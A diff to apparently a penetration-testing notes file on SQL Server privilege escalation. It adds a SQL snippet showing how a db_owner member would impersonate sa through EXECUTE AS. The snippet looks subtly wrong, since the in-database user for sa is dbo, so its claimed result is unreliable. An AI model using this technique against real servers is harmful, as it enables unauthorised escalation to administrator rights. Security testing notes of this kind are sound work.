@@ -203,7 +203,28 @@ exec test
   * That creates a stored procedure as the dbo user
   * Doesn’t have permissions in objects referenced in the SP
 * Applies to views, triggers and user defined functions
-* Any db_owner can impersonate sa when sa is dbo
+* Any db_owner can impersonate sa when sa is dbo:
+```
+-- Assume 'TestDB' is the name of the database
+USE TestDB;
+
+-- Create a user and make them a member of the db_owner role
+CREATE LOGIN TestUser WITH PASSWORD = 'StrongPassword';
+CREATE USER TestUser FOR LOGIN TestUser;
+ALTER ROLE db_owner ADD MEMBER TestUser;
+
+-- Set sa as the owner of the database
+ALTER AUTHORIZATION ON DATABASE::TestDB TO sa;
+
+-- Now, TestUser can impersonate sa within TestDB
+EXECUTE AS USER = 'sa';
+
+-- Check the current user (should show sa)
+SELECT SUSER_SNAME();
+
+-- Revert back to the original user
+REVERT;
+```
 * Also works when using Windows Authentication
 
 ### Thoughts and Workflow made by MSDAT, good to do a checklist (msdat: https://github.com/quentinhardy/msdat)
